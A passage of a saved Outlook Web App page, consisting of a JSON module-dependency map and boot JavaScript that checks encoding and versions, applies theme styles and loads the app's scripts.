PackagedStrings":[],"IncludedSlabs":["forgottenattachment"]},"commoncompose":{"Dependencies":["deferredboot"],"Types":[],"Templates":[],"Styles":[],"Configurations":[{"type":"CommonComposeComponent"}],"Sources":[{"name":"microsoft.owa.common.compose.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["commoncompose"]},"survey":{"Dependencies":["nonbootwebservices","deferredboot"],"Types":["_y.hn","_y.hm"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.survey.mouse.css","type":"Themed"}],"Configurations":[{"layout":"Mouse","type":"SurveyComponent"}],"Sources":[{"layout":"Mouse","name":"microsoft.owa.survey.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["survey"]},"mailcompose":{"Dependencies":["nonbootwebservices","commoncompose","editor","peoplecore","personacontrol","recipientwell","findpeople","deferredboot","mailcommon","lightning"],"Types":["_db.bd","_y.t","_y.io","_y.T","_y.is","_y.iq","_y.hv"],"Templates":["MailComposeView","MailInlineComposeView","MailComposeUnifiedView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.mail.compose.mouse.css","type":"Themed"}],"Configurations":[{"type":"MailComposeComponent"}],"Sources":[{"name":"microsoft.owa.mail.compose.js"},{"layout":"Mouse","name":"microsoft.owa.mail.compose.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.meetingmsgstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["mailcompose"]},"instantsearch":{"Dependencies":["deferredwebservices","nonbootwebservices","personacontrol","calendarcontrols","deferredboot","moderngroupssearchshared","lightning"],"Types":["_y.cB","_y.fe","_db.P"],"Templates":["InstantSearchContainerView","InstantSearchButtonsTemplate"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.instantsearch.mouse.css","type":"Themed"}],"Configurations":[{"type":"InstantSearchComponent"}],"Sources":[{"name":"microsoft.owa.core.instantsearch.js"},{"layout":"Mouse","name":"microsoft.owa.core.instantsearch.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["instantsearch"]},"searchsuggestions":{"Dependencies":["instantsearch","personacontrol"],"Types":["_db.cv","_db.cu","_db.br","_db.bp","_is.u","_is.v"],"Templates":["SearchSuggestionPopupView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.search.suggestions.mouse.css","type":"Themed"}],"Configurations":[{"type":"SearchSuggestionsComponent"}],"Sources":[{"name":"microsoft.owa.search.suggestions.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["searchsuggestions"]},"topicbasedpeoplesuggestions":{"Dependencies":["searchsuggestions","findpeople"],"Types":["_is.bc"],"Templates":[],"Styles":[],"Configurations":[{"type":"TopicBasedPeopleSuggestionsComponent"}],"Sources":[{"name":"microsoft.owa.search.suggestionsv2.topicbasedpeople.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["topicbasedpeoplesuggestions"]},"emailsuggestions":{"Dependencies":["instantsearch","nonbootwebservices","personacontrol"],"Types":["_db.dg","_is.bq","_is.bp"],"Templates":["EmailSuggestionView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.search.emailsuggestions.mouse.css","type":"Themed"}],"Configurations":[{"type":"EmailSuggestionsComponent"}],"Sources":[{"name":"microsoft.owa.search.emailsuggestions.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["emailsuggestions"]},"consumerfirstrun":{"Dependencies":["nonbootwebservices","shellplus","lightning"],"Types":["_db.R"],"Templates":[],"Styles":[{"layout":"Mouse","name":"nbsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.consumerfirstrun.mouse.css","type":"Themed"}],"Configurations":[{"layout":"Mouse","type":"ConsumerFirstRunComponent"}],"Sources":[{"layout":"Mouse","name":"microsoft.owa.consumerfirstrun.js"}],"PackagedSources":[],"Strings":[{"layout":"Mouse","name":"microsoft.owa.strings.cfirstrun.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["consumerfirstrun"]},"hashtagsux":{"Dependencies":["nonbootwebservices","deferredwebservices","editor","personacontrol","mailcommon"],"Types":["_y.eY","_y.eh","_y.dI","_y.eX"],"Templates":["TagSetContainerWrapper"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.core.tagset.mouse.css","type":"Themed"}],"Configurations":[{"type":"TagSetComponent"}],"Sources":[{"name":"microsoft.owa.core.tagset.js"},{"layout":"Mouse","name":"microsoft.owa.core.tagset.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["hashtagsux"]},"categorytree":{"Dependencies":["deferredboot"],"Types":["_y.hO","_y.kp"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.categorytree.mouse.css","type":"Themed"}],"Configurations":[{"type":"CategoryTreeComponent"}],"Sources":[{"layout":"Mouse","name":"microsoft.owa.categorytree.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["categorytree"]},"readingpaneshared":{"Dependencies":["nonbootwebservices","personacontrol","deferredboot","findpeople"],"Types":["_y.il","_y.gJ"],"Templates":["LikeView","LikeView.LikersList","LikeView.LikeButton"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.readingpaneshared.mouse.css","type":"Themed"}],"Configurations":[{"type":"ReadingPaneSharedComponent"}],"Sources":[{"name":"microsoft.owa.readingpaneshared.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["readingpaneshared"]},"feedback":{"Dependencies":["nonbootwebservices","deferredboot"],"Types":["_y.iL","_db.M","_y.ft","_y.eq","_y.fP","_y.fO"],"Templates":["FeedbackInfoBarMessageView","ScreenshotView","ScreenshotAnnotatorView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.feedback.mouse.css","type":"Themed"}],"Configurations":[{"layout":"Mouse","type":"FeedbackComponent"}],"Sources":[{"layout":"Mouse","name":"microsoft.owa.feedback.js"},{"layout":"Mouse","name":"uservoicewidget.js"},{"layout":"Mouse","name":"osefo.js"},{"layout":"Mouse","name":"html2canvas.js"}],"PackagedSources":[],"Strings":[{"layout":"Mouse","name":"microsoft.exchange.clients.owa2.client.strings.localized.min.js"},{"layout":"Mouse","name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"},{"layout":"Mouse","name":"microsoft.exchange.clients.owa2.client.options.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["feedback"]},"skypepromotion":{"Dependencies":["nonbootwebservices","deferredboot","lightning"],"Types":["_db.by"],"Templates":[],"Styles":[],"Configurations":[{"layout":"Mouse","type":"SkypePromotionComponent"}],"Sources":[{"name":"microsoft.owa.skypepromotion.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.owa.skypepromotion.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["skypepromotion"]},"deferredwebservices":{"Dependencies":[],"Types":[],"Templates":[],"Styles":[],"Configurations":[{"type":"DeferredWebServicesComponent"}],"Sources":[{"name":"microsoft.owa.boot.deferred.webservices.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["deferredwebservices"]},"deferredboot":{"Dependencies":["deferredjquery","deferredwebservices"],"Types":["_y.hh","_h.n","_h.bW","_h.U","_y.iJ","_y.lE","_g.hx","_y.cS","_a.dc","_y.go","_y.dQ","_y.gD","_db.t","_y.bl","_y.cD","_y.gN"],"Templates":["ActivityIndicatorPanelView","AppStatusBarView","ArchiveFolderPickerView","BasicInfoBar","CategoryColorPickerTemplates.CategoryColorViewLabelTemplate","CategoryColorPickerTemplates.ColorGridMenuItemTemplate","CategoryColorPickerTemplates.ColorMenuItemTemplate","ConfirmDialog","ContextPeekView","DelayedSendInformationView","FilterByButtonView","FolderPickerContentView","FolderPickerForestView","FolderPickerTouchNarrowView","InfobarBullet","InfoBarMessageForComplexContent","InfoBarMessageSimple","InfoBarMessageWithAction","InfoBarMouse","InfoBarNarrow","InfoBarWide","LocationPlainTextView","MailSearchContainerView","MailSearchSuggestionItemView","MessageBoxContentView","MessageBoxDefaultView","OwaUserConfigurationUpdatedView","OtherUserMailboxFolderTreeView","ResizeControl.ResizeBox","SearchBarAndroidView","SearchBarIOSView","SearchContainerView","SearchContainerViewAppBar","SearchRefinerView","SearchSettingsView","SwipeMenu","UserActionsInformationView","VotingOptionsView","NotificationBarDefaultView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.boot.deferred.mouse.css","type":"Themed"},{"layout":"Mouse","name":"microsoft.owa.core.controls.extended.mouse.css","type":"Themed"}],"Configurations":[{"type":"BootDeferredComponent"}],"Sources":[{"name":"microsoft.owa.core.controls.extended.js"},{"name":"microsoft.owa.boot.deferred.js"},{"name":"clientauth.tokenprovider.js"},{"layout":"Mouse","name":"microsoft.owa.boot.deferred.mouse.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.coredeferredstrings.localized.min.js"},{"name":"microsoft.owa.boot.deferredstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["deferredboot"]},"analytics":{"Dependencies":[],"Types":["_y.hL"],"Templates":[],"Styles":[],"Configurations":[{"type":"AnalyticsComponent"}],"Sources":[{"name":"microsoft.owa.analytics.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["analytics"]},"ariaanalytics":{"Dependencies":[],"Types":["_a.eU"],"Templates":[],"Styles":[],"Configurations":[{"type":"AriaAnalyticsComponent"}],"Sources":[{"name":"microsoft.owa.ariaanalytics.js"},{"name":"aria-web-telemetry.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["ariaanalytics"]},"sackeranalytics":{"Dependencies":[],"Types":["_y.iC"],"Templates":[],"Styles":[],"Configurations":[{"type":"SackerAnalyticsComponent"}],"Sources":[{"name":"microsoft.owa.sackeranalytics.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["sackeranalytics"]},"nonbootwebservices":{"Dependencies":["deferredwebservices"],"Types":["_g.eU"],"Templates":[],"Styles":[],"Configurations":[{"type":"NonBootWebServicesComponent"}],"Sources":[{"name":"microsoft.owa.core.nonboot.webservices.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["nonbootwebservices"]},"foresight":{"Dependencies":["deferredboot","calendarwebservices","calendarcore","calendarpeek"],"Types":["_y.gM"],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.foresight.mouse.css","type":"Themed"}],"Configurations":[{"type":"ForesightComponent"}],"Sources":[{"name":"microsoft.owa.foresight.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["foresight"]},"messagelistadsreadingpane":{"Dependencies":["deferredboot","readingpane","textboys"],"Types":["_rp.O"],"Templates":["MessageListAdsReadingPaneView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.messagelistads.readingpane.mouse.css","type":"Themed"}],"Configurations":[{"type":"MessageListAdsReadingPaneComponent"}],"Sources":[{"name":"microsoft.owa.messagelistads.readingpane.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.owa.messagelistads.strings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.coredeferredstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.strings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.commonstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["messagelistadsreadingpane"]},"serviceworkerboot":{"Dependencies":["deferredboot"],"Types":["_db.dt"],"Templates":[],"Styles":[],"Configurations":[{"type":"ServiceWorkerComponent"}],"Sources":[{"name":"microsoft.owa.serviceworkerboot.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["serviceworkerboot"]},"clientoptin":{"Dependencies":["deferredboot","lightning"],"Types":["_db.bx"],"Templates":["ClientOptInFRE","ClientReOptInModalDialog"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.clientoptin.mouse.css","type":"Themed"}],"Configurations":[{"type":"ClientOptInComponent"}],"Sources":[{"name":"microsoft.owa.clientoptin.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["clientoptin"]},"calendarwebservices":{"Dependencies":["deferredwebservices"],"Types":[],"Templates":[],"Styles":[],"Configurations":[{"type":"CalendarWebServicesComponent"}],"Sources":[{"name":"microsoft.owa.calendar.webservices.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["calendarwebservices"]},"focusedinboxrollup":{"Dependencies":["deferredwebservices","nonbootwebservices","deferredboot","lightning","bundledmail"],"Types":["_y.hY"],"Templates":["FocusedRollupItemView.Mouse","FocusedInboxConsumerFRE","FocusedOtherMoveMenuFRE"],"Styles":[{"layout":"Mouse","name":"nbsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.focusedinboxrollup.mouse.css","type":"Themed"}],"Configurations":[{"type":"FocusedInboxRollupComponent"}],"Sources":[{"name":"microsoft.owa.focusedinboxrollup.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["focusedinboxrollup"]},"lightning":{"Dependencies":["boot","deferredwebservices","deferredboot"],"Types":[],"Templates":["LightningPeekView","LightningPrimaryView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.lightning.mouse.css","type":"Themed"}],"Configurations":[{"type":"LightningComponent"}],"Sources":[{"name":"microsoft.owa.lightning.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.owa.lightning.strings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["lightning"]},"prefetch":{"Dependencies":[],"Types":["_a.cV"],"Templates":[],"Styles":[],"Configurations":[{"type":"PrefetchComponent"}],"Sources":[{"name":"microsoft.owa.prefetch.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["prefetch"]},"schedulespeek":{"Dependencies":["boot","deferredboot","calendarcore","calendarcontrols","calendarwebservices","calendartheming","meetingmessage","locationwell","schedules","calendarpeek","calendarsurface"],"Types":[],"Templates":["SchedulesItemPeekViewContainer"],"Styles":[{"layout":"Mouse","name":"nbsprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"microsoft.owa.calendar.schedules.peek.mouse.css","type":"Themed"}],"Configurations":[{"type":"SchedulesPeekComponent"}],"Sources":[{"name":"microsoft.owa.calendar.schedules.peek.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["schedulespeek"]},"frepanel":{"Dependencies":["react","deferredboot"],"Types":["_y.fJ"],"Templates":["FREPanelView"],"Styles":[],"Configurations":[{"type":"FREPanelComponent"}],"Sources":[{"name":"owa.clientnext.frepanel.js"},{"name":"microsoft.owa.frepanel.js"}],"PackagedSources":[],"Strings":[],"PackagedStrings":[],"IncludedSlabs":["frepanel"]},"accessibilitychecker":{"Dependencies":["boot","deferredboot","mailcommon"],"Types":["_mco.E"],"Templates":["AccCheckerPaneNavigatorView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.accessibilitychecker.mouse.css","type":"Themed"}],"Configurations":[{"type":"AccessibilityCheckerComponent"}],"Sources":[{"name":"microsoft.owa.accessibilitychecker.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["accessibilitychecker"]},"officepay":{"Dependencies":["boot","extensibility"],"Types":["_y.bV"],"Templates":["OPayView"],"Styles":[{"layout":"Mouse","name":"microsoft.owa.officepay.mouse.css","type":"Themed"}],"Configurations":[{"type":"OfficePayComponent"}],"Sources":[{"name":"microsoft.owa.officepay.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.nonbootstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["officepay"]},"boot":{"Dependencies":[],"Types":["_t.c","_j.t","_y.dv","_y.ej"],"Templates":["HeaderView","MessageListAdsListView"],"Styles":[{"layout":"Mouse","name":"sprite1.mouse.css","type":"Sprite"},{"layout":"Mouse","name":"boot.worldwide.mouse.css","type":"Themed"}],"Configurations":[{"type":"CoreFrameworkComponent"},{"type":"BootModelsComponent"},{"type":"CoreControlsComponent"},{"type":"CoreWebServicesComponent"},{"type":"ApplicationAppComponent"},{"type":"BootViewModelsComponent"},{"type":"BootViewsComponent"},{"type":"MailListViewComponent"},{"type":"XOMailListViewViewsV2Component"},{"type":"BootReadingPaneComponent"},{"type":"O365ShellCoreG2Component"},{"layout":"Mouse","type":"O365G2HeaderComponent"}],"Sources":[{"name":"empty.js"},{"name":"microsoftajax.js"},{"name":"promise-polyfill-6.0.2.min.js"},{"name":"globalize.js"},{"isDeferrable":true,"name":"microsoft.jsmvvm.framework.js"},{"isDeferrable":true,"name":"microsoft.jsmvvm.controls.js"},{"isDeferrable":true,"name":"microsoft.fabric.framework.js"},{"isDeferrable":true,"name":"microsoft.fabric.models.js"},{"isDeferrable":true,"name":"microsoft.fabric.controls.js"},{"isDeferrable":true,"name":"microsoft.fabric.controls.extended.js"},{"isDeferrable":true,"name":"microsoft.owa.core.notifications.js"},{"isDeferrable":true,"name":"microsoft.owa.core.framework.js"},{"name":"microsoft.owa.program.js"},{"isDeferrable":true,"name":"microsoft.owa.core.webservices.js"},{"isDeferrable":true,"name":"microsoft.owa.boot.common.js"},{"isDeferrable":true,"name":"microsoft.owa.boot.models.js"},{"isDeferrable":true,"name":"microsoft.owa.boot.viewmodels.js"},{"isDeferrable":true,"name":"microsoft.owa.core.controls.js"},{"isDeferrable":true,"name":"microsoft.owa.boot.views.js"},{"layout":"Mouse","isDeferrable":true,"name":"microsoft.owa.boot.views.mouse.js"},{"isDeferrable":true,"name":"microsoft.owa.application.app.js"},{"isDeferrable":true,"name":"microsoft.owa.maillistviewmodels.js"},{"isDeferrable":true,"name":"microsoft.owa.triageactions.js"},{"isDeferrable":true,"name":"microsoft.owa.maillistview.js"},{"layout":"Mouse","name":"microsoft.owa.maillistview.mouse.js"},{"isDeferrable":true,"name":"microsoft.owa.xomaillistviewviewsv2.js"},{"layout":"Mouse","isDeferrable":true,"name":"microsoft.owa.xomaillistviewviewsv2.mouse.js"},{"isDeferrable":true,"name":"microsoft.owa.boot.bootreadingpane.js"},{"isDeferrable":true,"name":"microsoft.o365.suiteutil.js"},{"isDeferrable":true,"name":"microsoft.o365.clientlogging.js"},{"isDeferrable":true,"name":"microsoft.o365.clientperformance.js"},{"isDeferrable":true,"name":"microsoft.o365.shellg2.coremin.js"},{"isDeferrable":true,"name":"microsoft.o365.shellg2.core.owa.js"},{"layout":"Mouse","name":"microsoft.o365.shellg2.core.owa.mouse.js"},{"isDeferrable":true,"name":"microsoft.owa.shellcoreg2.o365.js"},{"layout":"Mouse","isDeferrable":true,"name":"microsoft.owa.header.o365g2.js"}],"PackagedSources":[{"layout":"Mouse","isDeferrable":true,"name":"boot.worldwide.0.mouse.js"},{"layout":"Mouse","isDeferrable":true,"name":"boot.worldwide.1.mouse.js"},{"layout":"Mouse","isDeferrable":true,"name":"boot.worldwide.2.mouse.js"},{"layout":"Mouse","isDeferrable":true,"name":"boot.worldwide.3.mouse.js"}],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.strings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.frameworkstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.bootcommonstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.bootmodelsstrings.localized.min.js"},{"name":"microsoft.exchange.clients.owa2.client.webservicesstrings.localized.min.js"},{"name":"microsoft.o365.shellg2.strings.localized.min.js"}],"PackagedStrings":[{"layout":"Mouse","name":"boot.worldwide.mouse.strings.localized.min.js"}],"IncludedSlabs":["bootjquery","boot","bootdiagnostics","xomaillistviewviews","bootreadingpane","header","reactmail","messagelistadslistview"]},"addroom":{"Dependencies":["deferredboot","deferredwebservices","calendarwebservices","calendarcore"],"Types":[],"Templates":[],"Styles":[{"layout":"Mouse","name":"microsoft.owa.calendar.addroom.mouse.css","type":"Themed"}],"Configurations":[{"type":"CalendarAddRoomComponent"}],"Sources":[{"name":"microsoft.owa.calendar.addroom.js"}],"PackagedSources":[],"Strings":[{"name":"microsoft.exchange.clients.owa2.client.calarstrings.localized.min.js"}],"PackagedStrings":[],"IncludedSlabs":["addroom"]}};
                
                
                var languageMarker = '##lang##';
                var cultureMarker = '##culture##';
                var localeMarker  = '##locale##';
            
                function checkUTFEncoding() {
                    var decodedString = "你好A";
                    if (htmlDec("&#20320;&#22909;&#65;") != decodedString) {
                        alert("Outlook requires your browser to use UTF-8 encoding. For your protection, you\u0027ll be signed out. Please set your browser encoding to UTF-8 and sign in again.");
                        window.location.href = "/owa/logoff.owa";
                    }
                }

                checkUTFEncoding();

                userScriptResources[userScriptResources.length] = { "fileName": "https://outlook.office365.com"};
userScriptResources[userScriptResources.length] = { "fileName": "https://outlook.office365.com"};
styleResources[styleResources.length] = { "fileName": "https://outlook.office365.com"};
styleResources[styleResources.length] = { "fileName": "https://outlook.office365.com"};

                window.scriptsLoaded = window.scriptsLoaded || {};

                
                    window.scriptsLoaded['boot.worldwide.0.mouse.init.js'] = 0;
                
                    window.scriptsLoaded['boot.worldwide.1.mouse.init.js'] = 0;
                
                    window.scriptsLoaded['boot.worldwide.2.mouse.init.js'] = 0;
                
                    window.scriptsLoaded['boot.worldwide.3.mouse.init.js'] = 0;
                
            }
            catch (ex) {
                window.owaLastErrorReported = ex;
                throw ex;
            }

            function UpdateUserData(template) {
                for (var i = 0; i < template.length; ++i) {
                    if (template[i] != null && template[i]["fileName"] != null) {
                        template[i]["fileName"] = template[i]["fileName"].replace(languageMarker, userLanguageVar).replace(cultureMarker, userCultureVar).replace(localeMarker, stylesLocale).toLowerCase();
                    }
                }
            }

            function setupUserSpecificResources(serverVersion, curTheme, curCulture, curLang, isRtl, minOwsVersion, serverOwsVersion, curStyleLocale, userSpecificResourcesHash, curFeatures, curDefaultAspxVer, fontFamilies, themedColors, headerTheme, forceBO, osfLang) {
                try{
                    var defaultPageVer = 7;
                    var forcePLTOnVersionChange = false;
                    var versionCheckPassed = defaultPageVer == curDefaultAspxVer;

                    if (forcePLTOnVersionChange) {
                        versionCheckPassed = versionCheckPassed && serverVersion == sver;
                    }
                    else {
                        if (true) {
                            var clientVer = _g.OWSVersion.create(_g.ClientVersionProvider.currentOWSVersion);
                            var serverVer = _g.OWSVersion.create(serverOwsVersion);
                            var minVer = _g.OWSVersion.create(minOwsVersion);
                            versionCheckPassed = versionCheckPassed && clientVer.supports(minVer);

                            if (false) {
                               versionCheckPassed = versionCheckPassed && serverVer.supports(clientVer);
                            }
                        }
                    }

                    var addStyles = function(blockId, blockContent) {
                        var styleBlock = null;
                        if (blockContent)
                        {
                            styleBlock = document.getElementById(blockId);
                            if (styleBlock)
                            {
                                styleBlock.appendChild(document.createTextNode(blockContent));
                            }
                        }
                    };

                    var replaceTokens = function(templateString, tokens) {
                        if (templateString) {
                            return templateString.replace(/@([^;}\/\\]+)/g, function(match, token) {
                                if (token in tokens) {
                                    if (/(^(#)?[0-9A-F]{6}$)|(^(#)?[0-9A-F]{3}$)/i.test(tokens[token])){
                                        if (tokens[token][0] != '#') {
                                            return '#' + tokens[token];
                                        }
                                    }
                                    return tokens[token];
                                }
                                return "transparent";
                            });
                        }

                        return '';
                    };

                    var localeStyles = '';
                    var themedColorStlyes = '';
                    var headerImageStyles = '';

                    if (typeof(fontFamilies) != 'undefined' && typeof(LocaleFontFamilyTemplate) != 'undefined') {
                        localeStyles += replaceTokens(LocaleFontFamilyTemplate, fontFamilies);
                    }

                    if (typeof(headerTheme) != 'undefined' && typeof(HeaderImageTemplate) != 'undefined') {
                        headerImageStyles += replaceTokens(HeaderImageTemplate, headerTheme);
                    }

                    if (typeof(themedColors) != 'undefined') {
                        if (typeof(ThemedColorTemplate) != 'undefined') {
                            themedColorStlyes += replaceTokens(ThemedColorTemplate, themedColors);
                        }

                        if (typeof(o365ColorTemplate) != 'undefined') {
                            themedColorStlyes += replaceTokens(o365ColorTemplate, themedColors);
                        }
                    }

                    if (localeStyles) {
                        addStyles("FontLocaleStyles", localeStyles);
                    }

                    if (themedColorStlyes) {
                        addStyles("ThemedColorStyles", themedColorStlyes);
                    }

                    if (headerImageStyles) {
                        addStyles("HeaderImages", headerImageStyles);
                    }

                    var redirectParam = 'ver' + '=' + serverVersion;
                    if (!forceBO && versionCheckPassed &&
                            (serverVersion == sver || 
                            (curTheme == clientTheme && curCulture == userCultureVar && curLang == userLanguageVar))|| 
                            window.location.href.indexOf(redirectParam) >=0) {
                        clientTheme = curTheme;
                        userCultureVar = curCulture;
                        userLanguageVar = curLang;
                        osfLanguageVar = osfLang;
                        userCultureRtl = isRtl;
                        stylesLocale = curStyleLocale;

                        document.getElementsByTagName("html")[0].setAttribute('dir', isRtl ? "rtl" : "ltr");

                        UpdateUserData(userScriptResources);
                        UpdateUserData(styleResources);

                        
                        if (isPopOut) {
                            window.owaSDState.usrPending = 0;
                            loadScripts(userScriptResources, cdnEndPointNameForBootResources != "", false);
                        } else {
                            window.owaSDState.usrPending += userScriptResources.length;
                            loadScripts(userScriptResources, cdnEndPointNameForBootResources != "", true, onUSRPendingComplete, onUSRPendingError);
                        }
                        
                    }
                    else {
                        if (!versionCheckPassed) {
                            setLocalStorageValue("rebootReason", "4");
                        }
                        else if (forceBO) {
                            setLocalStorageValue("rebootReason", "11");
                        }
                        else {
                            setLocalStorageValue("rebootReason", "7");
                        }
                        redirect('ver', serverVersion,'cver', sver, 'vC', (versionCheckPassed ? 1 : 0), 'forceBO', forceBO);
                    }
                }
                catch (ex) {
                    window.owaLastErrorReported = ex;
                    throw ex;
                }
            }
        </script>
        
        <span style="font-family:&quot;wf_segoe-ui_light&quot;;">t</span>
        <span style="font-family:&quot;wf_segoe-ui_normal&quot;;">t</span>
        <span style="font-family:&quot;wf_segoe-ui_semibold&quot;;">t</span>
        <span style="font-family:&quot;wf_segoe-ui_semilight&quot;;">t</span>
        <span style="font-family:&quot;webfontPreload&quot;;"></span>
        
        <script src="./Outlook_files/boot_002.js.download" onerror="onScriptLoadError2(this)"></script>
        <script>parseEndTimes["boot.worldwide.0.mouse.init.js"] = ((new Date()) - window.dateZero);</script>
        
        <script src="./Outlook_files/boot_003.js.download" onerror="onScriptLoadError2(this)"></script>
        <script>parseEndTimes["boot.worldwide.1.mouse.init.js"] = ((new Date()) - window.dateZero);</script>
        
        <script src="./Outlook_files/boot.js.download" onerror="onScriptLoadError2(this)"></script>
        <script>parseEndTimes["boot.worldwide.2.mouse.init.js"] = ((new Date()) - window.dateZero);</script>
        
        <script src="./Outlook_files/boot_004.js.download" onerror="onScriptLoadError2(this)"></script>
        <script>parseEndTimes["boot.worldwide.3.mouse.init.js"] = ((new Date()) - window.dateZero);</script>
        
        <script>parseEndTimes["allBootScripts"] = ((new Date()) - window.dateZero);</script>

        
        <script>
            if (isPopOut) {
                document.write("<script src='" + "userspecificresourceinjector.ashx?ver=16.2279.14.2549832&swclient=1&layout=mouse" + "'></"+"script>");
                document.write("<script" + ">parseEndTimes['userspecificresourceinjector.ashx'] = ((new Date()) - window.dateZero);</"+"script>");
                document.write("<script" + ">loadStyles(styleResources);</"+"script>");
            }
        </script>
        
            <script>
                try{
                    window.owaSDState.usrConsumable = true;
                    tryConsumeUSR();
                }
                catch (ex){
                    window.owaLastErrorReported = ex;
                    throw ex;
                }
            </script>
        
        <script>
            function cdnVersionCheckFailed() {
                var redirectParam = 'https://outlook.office365.com';
                if (window.location.href.indexOf(redirectParam) < 0) {
                    redirect('cdn', '1', 'ver', sver);
                }
            }

            try
            {
                var scriptElement = document.createElement("script");
                scriptElement.src = "https://r4.res.office365.com/owa/prem/16.2279.14.2549832/scripts/cdnversioncheck.js" + "?rand=" + Date.now();
                scriptElement.async = true;
                scriptElement.onerror = cdnVersionCheckFailed;
                document.getElementsByTagName('body')[0].appendChild(scriptElement);
            }
            catch (ex)
            {
                window.owaLastErrorReported = ex;
                throw ex;
            }
        </script>
        
            <img src="./Outlook_files/saved_resource" alt="">
        
    <script src="./Outlook_files/saved_resource" async=""></script>
  
    
    <script>
        
       
            catch (ex) {
                window.owaLastErrorReported = ex;
                throw ex;
            }
        }

        function owastart() {
            if (!userSpecificsLoaded && window.owaSD.status == 200) {
                handleBootError2('UserSpecificError');
                return;
            }

            if (!window.owaSD || window.owaSDState.consumed) {
                return;
            }

            window.owaSDState.consumed=true;
            if (window.owaSD.readyState == 4) { 
                if (window.owaSD.status == 200) {
                    try {
                        PageDataPayload = JsonParser.deserialize(window.owaSDState.data);               
                        besver = window.owaSD.getResponseHeader("X-OWA-Version")

                        
                    } catch (e) { 
                        var data = window.owaSDState.data;
                        var validResponse = data != null && data.indexOf('{') == 0 && data.lastIndexOf('}') == data.length-1 && data.indexOf('owaUserConfig') != -1;
                        var SDIsNotNull = data != null;
                        var errMsg = 'SrvErr:' + window.owaSD.getResponseHeader("X-OWA-Error") + ',ClientErr:' + e.message + ',ValidResponse:' + validResponse + ',SDIsNotNull:' + SDIsNotNull;
                        if (SDIsNotNull)
                        {
